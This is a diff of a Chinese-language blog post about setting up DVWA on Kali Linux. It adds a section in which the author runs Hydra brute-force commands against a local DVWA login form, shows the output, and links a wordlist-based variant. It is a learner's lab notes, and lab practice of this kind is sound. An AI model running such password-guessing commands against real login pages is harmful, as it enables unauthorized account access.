@@ -10,7 +10,7 @@ tags: [Technical] # add tag
 
 ## 契机
 
-在一个课程上看到了DVWA的使用，想要好好尝试一下，安装过程中遇到了下面的一些问题，记录下来，一边以后忘记。
+在一个课程上看到了DVWA的使用，想要好好尝试一下，安装过程中遇到了下面的一些问题，记录下来，以免以后忘记。
 
 ## 安装XAMPP
 
@@ -19,7 +19,7 @@ DVWA的安装包中附着一个README文件
 挑重点一看，官方推荐是哟功能XAMPP来作为网站的服务器。
 遂下载
 该服务器发布的版本中有Linux的deb安装包，下载之后，直接dkpg -i到Kali Linux上。
-呐，Kali Linux呢，可能会报以些依赖问题，就按照报错中的解决依赖语句，直接贴在上一次运行的结果后面回车运行，应该就没问题了。
+呐，Kali Linux呢，可能会报一些依赖问题。就按照报错中提示的解决依赖语句，直接贴在上一次运行的结果后面回车运行，应该就没问题了。
 
 ## 部署DVWA和设置数据库
 
@@ -99,4 +99,69 @@ MariaDB [dvwa]> select * from users;
 +---------+------------+-----------+---------+----------------------------------+----------------------------------+---------------------+--------------+
 5 rows in set (0.001 sec)
 ```
+#Brute Force Attack
+先玩了一下暴力破解的模块
+找到了Kali Linux的密码破解工具箱里有一个叫Hydra的东东，打开是一堆命令行：
+研究了半天命令行怎么用，最终琢磨出来下面的命令行：
+-x 6:6:a1 表示，即时生成6位以小写字母和数字构成的密码，逐个尝试
+127.0.0.1 自己搭建的服务器地址，应为网站域名
+http-post-form 帐号密码提交属于这个请求类别
+/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:S=logout ^USER^ ^PASS^ 均为占位符，对应前面的用户名和密码
+
+```
+hydra -l gordonb -x 6:6:a1 127.0.0.1 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:S=logout" -vV -f
+
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-14 09:29:29
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 2176782336 login tries (l:1/p:2176782336), ~136048896 tries per task
+[DATA] attacking http-post-form://127.0.0.1:80/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:S=logout
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaaa" - 1 of 2176782336 [child 0] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaab" - 2 of 2176782336 [child 1] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaac" - 3 of 2176782336 [child 2] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaad" - 4 of 2176782336 [child 3] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaae" - 5 of 2176782336 [child 4] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaaf" - 6 of 2176782336 [child 5] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaag" - 7 of 2176782336 [child 6] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaah" - 8 of 2176782336 [child 7] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaai" - 9 of 2176782336 [child 8] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaaj" - 10 of 2176782336 [child 9] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaak" - 11 of 2176782336 [child 10] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaal" - 12 of 2176782336 [child 11] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaam" - 13 of 2176782336 [child 12] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaan" - 14 of 2176782336 [child 13] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaao" - 15 of 2176782336 [child 14] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaap" - 16 of 2176782336 [child 15] (0/0)
+[VERBOSE] Page redirected to http://127.0.0.1/dvwa/login.php
+[VERBOSE] Page redirected to http://127.0.0.1/dvwa/login.php
+[VERBOSE] Page redirected to http://127.0.0.1/dvwa/login.php
+[VERBOSE] Page redirected to http://127.0.0.1/dvwa/login.php
+[VERBOSE] Page redirected to http://127.0.0.1/dvwa/login.php
+[VERBOSE] Page redirected to http://127.0.0.1/dvwa/login.php
+[VERBOSE] Page redirected to http://127.0.0.1/dvwa/login.php
+[VERBOSE] Page redirected to http://127.0.0.1/dvwa/login.php
+...
+```
+运行之后，程序就开始一行一行猜了，我算了一下，一共6位密码，每一位有36种可能，假设每秒钟可以尝试36组密码，大约需要699.84天...天啊...遂把程序停掉...
+用密码试一试，看看破解的界面长什么样好了...
+```
+kate@Argo:~$ hydra -l gordonb -p abc123 127.0.0.1 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:S=logout" -vV -f
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-14 09:42:45
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
+[DATA] attacking http-post-form://127.0.0.1:80/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:S=logout
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "abc123" - 1 of 1 [child 0] (0/0)
+[VERBOSE] Page redirected to http://127.0.0.1/dvwa/login.php
+[STATUS] attack finished for 127.0.0.1 (waiting for children to complete tests)
+1 of 1 target completed, 0 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-14 09:42:55
+
+```
+看来还是使用常用密码文本破解一下效率会比较高...
+
+[hydra -L usernames.txt -P passwords.txt 127.0.0.1 http-post-form “/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed”](https://redteamtutorials.com/2018/10/25/hydra-brute-force-https/)
 
